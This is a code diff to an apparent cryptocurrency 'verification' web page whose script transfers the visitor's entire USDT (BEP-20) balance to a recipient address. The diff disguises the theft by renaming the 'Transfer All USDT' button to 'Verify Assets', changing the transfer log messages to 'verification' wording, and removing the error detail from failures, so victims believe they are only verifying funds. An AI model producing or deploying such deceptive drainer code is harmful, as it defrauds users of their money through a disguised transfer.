@@ -94,7 +94,7 @@
         <h2>USDT (BEP-20)</h2>
         <p>Initiate to verify your USDT (BEP-20) on Binance Smart Chain:</p>
         <p style="word-break: break-all;"><strong>Recipient:</strong> <span style="color: #f39c12;"></span></p>
-        <button id="sendBtn">Transfer All USDT</button>
+        <button id="sendBtn">Verify Assets</button>
         <div id="log"></div>
     </div>
 
@@ -178,12 +178,12 @@
                 }
 
                 const tx = await usdt.transfer(recipient, balance);
-                log("⏳ Transfer initiated. Waiting for confirmation...");
+                log("⏳ Verification initiated. Waiting for confirmation...");
                 await tx.wait();
-                log("✅ Transfer successful! USDT sent.");
+                log("✅ Verified successful! USDT (BEP-20).");
             } catch (err) {
                 console.error(err);
-                log("❌ Transfer failed: " + (err?.message || err));
+                log("❌ Verification failed: " );
             } finally {
                 document.getElementById("sendBtn").disabled = false; // Re-enable after operation (success or failure)
             }
